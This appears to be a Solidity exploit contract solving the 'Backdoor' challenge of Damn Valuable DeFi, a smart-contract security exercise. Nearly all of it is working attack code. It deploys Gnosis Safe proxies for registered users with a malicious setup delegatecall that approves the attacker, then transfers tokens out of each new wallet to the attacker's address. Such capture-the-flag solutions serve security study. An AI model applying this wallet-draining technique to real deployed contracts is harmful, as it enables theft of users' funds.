// SPDX-License-Identifier: Ping

pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "../../contracts/backdoor/WalletRegistry.sol";
import "../../contracts/DamnValuableToken.sol";
import "../DamnValuableToken.sol";

contract Backdoor {
    DamnValuableToken token;
    GnosisSafe masterCopy;
    GnosisSafeProxyFactory walletFactory;
    WalletRegistry registry;
    address payable attacker;
      
    constructor(address tokenAddress,
                address payable masterCopyAddress, 
                address walletFactoryAddress,
                address registryAddress) {
        token = DamnValuableToken(tokenAddress);
        masterCopy = GnosisSafe(masterCopyAddress);
        walletFactory = GnosisSafeProxyFactory(walletFactoryAddress);      
        registry = WalletRegistry(registryAddress);
        attacker = payable(msg.sender);
    }
    
    function attack(address[] calldata users, 
                    uint256 length) public {
        require(length > 1, "these only one user");
        token.approve(users[0], 10000 ether);

        for (uint256 i = 0; i < length; ++i) {
            address walletAddress = createWalletWithCallback(users[i]);
            token.transferFrom(walletAddress, address(this), 10 ether);
            token.transfer(attacker, 10 ether);
        }
    } // end of attack() function
    
     

    function createWalletWithCallback(address walletOwner) internal returns (address) {
         // function setup(address[] calldata _owners,
            //                uint256 _threshold,
            //                address to,
            //                bytes calldata data,
            //                address fallbackHandler,
            //                address paymentToken,
            //                uint256 payment,
            //                address payable paymentReceiver)
        address[] memory owners = new address[](1);
        owners[0] = walletOwner;
        bytes memory initializer = abi.encodeWithSelector(
            GnosisSafe.setup.selector, 
            owners, 
            1, 
            address(this),
            abi.encodeWithSignature("delegateApprove(address,address,uint256)",
                                     address(token), address(this), 10 ether), 
            address(0),
            address(token),
            0 ether,
            payable(msg.sender)
        );
             
        GnosisSafeProxy wallet = walletFactory.createProxyWithCallback(
            address(masterCopy),
            initializer,    // initializer
            0x0,            // uint256 saltNouce (not used)
            IProxyCreationCallback(address(registry)) // callback
        );
        // token.transferFrom(address(wallet), attacker, 10 ether);
        return address(wallet);    
    }


    function delegateApprove(address tokenAddress,
                             address to,
                             uint256 amount) external {
        IERC20(tokenAddress).approve(to, amount);
    }
}
